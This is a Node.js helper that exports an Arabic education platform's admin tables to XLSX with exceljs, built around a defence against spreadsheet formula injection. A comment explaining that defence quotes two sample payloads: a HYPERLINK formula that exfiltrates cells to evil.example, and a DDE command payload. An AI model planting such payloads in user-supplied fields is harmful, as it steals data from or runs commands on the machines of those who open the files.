/* =========================================================================
   XLSX EXPORT — one helper for all three admin tables.

   Usage from a route:

     const { sendSheet } = require("../util/excel");
     await sendSheet(res, {
       filename: "students",
       sheetName: "الطلاب",
       columns: [{ header: "الاسم", key: "name", width: 28 }, …],
       rows: rows,                 // array of plain objects keyed as above
     });

   WHY exceljs AND NOT `xlsx`
   The npm package `xlsx` is frozen at 0.18.5 with two unpatched advisories —
   CVE-2023-30533 (prototype pollution) and CVE-2024-22363 (ReDoS). SheetJS
   ships fixes only from their own CDN, not npm, so `npm i xlsx` installs the
   vulnerable build. exceljs is maintained on npm and writes real OOXML.

   WHY STREAMING IS NOT USED
   exceljs has a streaming writer, but these three tables are bounded by the
   student roster (hundreds, not millions). Buffering the whole workbook lets
   Content-Length be set and, more importantly, lets a mid-generation failure
   still reach the Express error handler — see the note on sendSheet.
   ====================================================================== */

const ExcelJS = require("exceljs");

/* SPREADSHEET FORMULA INJECTION (CWE-1236).

   Every text cell in these exports is user-supplied: `fullName`, `phoneNumber`
   and `cardNumber` come from the public signup form on the login page. Excel
   evaluates any cell whose text begins =, +, - or @ as a formula, so a student
   registering as

     =HYPERLINK("https://evil.example/?"&A1&A2,"اضغط هنا")

   produces a clickable link in the admin's download that exfiltrates the
   neighbouring cells. `=cmd|' /c calc'!A0` is the DDE variant. The admin is
   the victim, and nothing on the page hints the cell is hostile.

   Prefixing a single quote is the standard mitigation: Excel treats the value
   as literal text and does not display the quote. Tab, CR and LF are also
   stripped — a name containing a newline breaks the cell into two visually.

   Numbers are passed through untouched: a real number is not a formula, and
   quoting it would left-align it and disable arithmetic on the column. */
const RISKY_START = /^[=+\-@\t\r]/;

function safeCell(value) {
  if (value == null) return "";
  if (typeof value === "number" || typeof value === "boolean") return value;
  if (value instanceof Date) return value;

  let text = String(value).replace(/[\r\n\t]+/g, " ").trim();
  if (RISKY_START.test(text)) text = "'" + text;
  return text;
}

/* Content-Disposition with a non-ASCII filename.

   The bare `filename=` parameter is defined over ISO-8859-1, so an Arabic
   sheet name in it is either mangled or rejected. RFC 5987 / RFC 6266 add
   `filename*=UTF-8''<percent-encoded>`, which every current browser prefers
   while older clients fall back to the plain ASCII one. Both are emitted.

   The ASCII fallback is scrubbed rather than transliterated: quotes and
   semicolons would terminate the header field early (header injection), and
   any non-ASCII byte is dropped. If nothing survives — an entirely Arabic
   name — "export" keeps the fallback a valid filename instead of ".xlsx". */
function disposition(name) {
  const base = String(name || "export").replace(/\.xlsx$/i, "");

  let ascii = base.replace(/[^\x20-\x7e]/g, "").replace(/["\\;,\r\n]/g, "");
  ascii = ascii.trim().replace(/\s+/g, "-");
  if (!ascii) ascii = "export";

  return (
    'attachment; filename="' +
    ascii +
    '.xlsx"; filename*=UTF-8\'\'' +
    encodeURIComponent(base + ".xlsx")
  );
}

/* YYYY-MM-DD in local time, for the filename suffix.

   toISOString() is UTC, which in Cairo (UTC+2/+3) labels anything exported
   before 02:00 with the previous day's date. An admin downloading two files
   an hour apart getting different dates is confusing, so the parts are read
   off the local-time getters instead. */
function stamp(date) {
  const d = date instanceof Date ? date : new Date();
  const p = (n) => String(n).padStart(2, "0");
  return d.getFullYear() + "-" + p(d.getMonth() + 1) + "-" + p(d.getDate());
}

/* Worksheet names are validated by Excel, not by exceljs: over 31 characters,
   or containing any of : \ / ? * [ ], and Excel calls the file corrupt and
   refuses to open it. The page titles here are short Arabic strings, but they
   are built from :type on the degrees page, so they get sanitised anyway. */
function safeSheetName(name) {
  const clean = String(name || "بيانات").replace(/[:\\/?*[\]]/g, " ").trim();
  return (clean || "بيانات").slice(0, 31);
}

/* Builds the workbook and writes it to the response.

   Returns a Promise. Callers MUST await it inside their try/catch: the buffer
   is built before a single byte is sent, so a failure here still has an intact
   response and can go to next(err) as a normal error page. Writing headers
   first and streaming would leave a truncated .xlsx download on failure, which
   Excel reports to the admin as a corrupt file rather than as a server error.

   EMPTY RESULTS produce a real workbook with the header row and a note, not a
   0-byte file and not an error. An admin who filters to a group with no
   students and clicks export should get a file that opens and shows nothing —
   the alternative is a download that Excel refuses, which reads as a bug in
   the platform rather than as an empty result. */
async function sendSheet(res, opts) {
  const o = opts || {};
  const columns = Array.isArray(o.columns) ? o.columns : [];
  const rows = Array.isArray(o.rows) ? o.rows : [];

  const wb = new ExcelJS.Workbook();
  wb.creator = "منصة أ/ مرڤت عبدالرحمن";
  wb.created = new Date();

  const ws = wb.addWorksheet(safeSheetName(o.sheetName));

  /* The whole point of the RTL flag: column A lands at the RIGHT edge and the
     columns run leftwards, matching the order the admin reads them in on the
     page. Without it the export is mirrored relative to the table it came
     from. Applied to the sheet view, so it survives a round-trip through
     Excel's own save. */
  ws.views = [{ rightToLeft: true, state: "frozen", ySplit: 1 }];

  ws.columns = columns.map((c) => ({
    header: c.header,
    key: c.key,
    width: c.width || 18,
    /* Optional Excel number format, e.g. "0%" — a percentage is stored as the
       fraction 0.35 and only DISPLAYS as 35% once the column carries the
       format. Without it the admin sees 0.35 and reads it as a third of a
       mark. Set on the column so it applies to rows added later, and so it
       survives Excel's own re-save. */
    style: c.numFmt ? { numFmt: c.numFmt } : undefined,
  }));

  const head = ws.getRow(1);
  head.font = { bold: true, color: { argb: "FFFFFFFF" }, size: 12 };
  head.fill = {
    type: "pattern",
    pattern: "solid",
    fgColor: { argb: "FF1F6FEB" },
  };
  head.alignment = { vertical: "middle", horizontal: "right" };
  head.height = 24;

  for (const row of rows) {
    const out = {};
    for (const c of columns) out[c.key] = safeCell(row ? row[c.key] : "");
    ws.addRow(out);
  }

  if (!rows.length) {
    const note = ws.addRow({});
    note.getCell(1).value = "لا توجد بيانات مطابقة للتصفية المحددة.";
    note.getCell(1).font = { italic: true, color: { argb: "FF6B7280" } };
    /* Merged across the table so the sentence is readable instead of being
       clipped at column A's width. */
    if (columns.length > 1) {
      ws.mergeCells(note.number, 1, note.number, columns.length);
    }
  }

  /* Turns the header row into a filter dropdown in Excel itself, so the admin
     can narrow the export further without coming back to the page. Only when
     there is data — an autofilter over a merged note row misbehaves. */
  if (rows.length && columns.length) {
    ws.autoFilter = {
      from: { row: 1, column: 1 },
      to: { row: 1, column: columns.length },
    };
  }

  const buffer = await wb.xlsx.writeBuffer();
  const name = (o.filename || "export") + "-" + stamp();

  res.setHeader(
    "Content-Type",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
  );
  res.setHeader("Content-Disposition", disposition(name));
  res.setHeader("Content-Length", buffer.length);
  /* These exports carry names, phone numbers and card numbers. Keeping them
     out of shared caches and proxies is worth two headers. */
  res.setHeader("Cache-Control", "no-store, private");
  res.setHeader("X-Content-Type-Options", "nosniff");

  return res.end(Buffer.from(buffer));
}

module.exports = {
  sendSheet,
  safeCell,
  safeSheetName,
  disposition,
  stamp,
};
